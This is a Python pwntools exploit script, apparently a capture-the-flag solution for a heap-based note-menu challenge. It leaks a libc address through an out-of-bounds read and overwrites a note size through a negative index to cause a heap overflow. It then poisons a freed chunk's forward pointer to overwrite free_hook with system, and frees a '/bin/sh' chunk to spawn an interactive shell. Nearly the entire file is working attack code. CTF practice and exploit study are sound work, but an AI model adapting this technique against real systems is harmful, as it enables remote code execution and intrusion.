#!/usr/bin/env python3

from pwn import *

exe = ELF('chall1ok', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()
ra = lambda : p.recvall()

def add(idx, size, data):
    slna(b'> ',1)
    slna(b'Index: ',idx)
    slna(b'Size: ',size)
    sa(b'Data: ',data)

def ed(idx, data):
    slna(b'> ',2)
    slna(b'Index: ',idx)
    sa(b'Data: ',data)

def rm(idx):
    slna(b'> ',3)
    slna(b'Index: ',idx)

def rd(idx):
    slna(b'> ',4)
    slna(b'Index: ',idx)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+90
        b*add_note+166
        b*remove_note+115

        c
        ''')
        input()
        # p = gdb.debug([exe.path],"""
        #     b*
        #     c
        #     """)
        # input()
        # return p

host = ''
port = 0

if args.REMOTE:
    # p = remote(host,port,ssl=True)
    p = remote(host,port)
else:
    p = process([exe.path])
GDB()

# Libc leak using out of bound
rd(-1872)
ru(b'Data: ')
lib = u64(r(6)+b'\0\0')
libc.address = lib - 0x26f30
info("Libc leak: "+hex(lib))
info("Libc base: "+hex(libc.address))
hook = libc.address + 0x1c5b28

# Using Hook Overwrite for shell
# This chunk for heap overflow
add(0, 0x50, b'a'*8)

# These chunk for poisoning
add(2, 0x50, b'b'*8)
add(3, 0x50, b'c'*8)

# Overite size note index 0
add(-4, 0x50, b'a'*8)
# Now, the size of note[0] is overwritten resulting in the heap overflow from chunk[0] to chunk[2] & [3]

# Remove chunk[3] first for the later allocation for /bin/sh
rm(3)
# Remove chunk[2] for the first allocation at hook
rm(2)

# Payload for the overwriting
p0 = flat(b'a'*0x58, 0x51, hook)

# Heap overflow -> overwrite the forward pointer of chunk 2 (replace &chunk[3] by hook address)
ed(0, p0)
# GDB()
# Remember not to allocate at idx 0 and 1 because notesize is now bring the pointer of the chunk[-4]
# Allocate for address of /bin/sh (the later freed chunk)
add(2, 0x50, b'/bin/sh\0')
# Allocate chunk 2 for hook overwrite to system (the first freed chunk now is replaced by free hook)
add(3, 0x50, p64(libc.sym.system))

# Free now will call free_hook(now is system) and the first arg is address of /bin/sh
rm(2)
p.interactive()